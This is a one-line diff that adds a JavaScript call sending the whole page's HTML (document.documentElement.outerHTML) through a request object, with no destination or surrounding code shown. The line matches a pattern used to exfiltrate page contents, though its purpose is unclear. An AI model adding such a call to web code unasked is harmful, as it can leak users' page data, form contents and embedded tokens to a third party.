@@ -1,0 +1,1 @@
+this.send(document.documentElement.outerHTML);
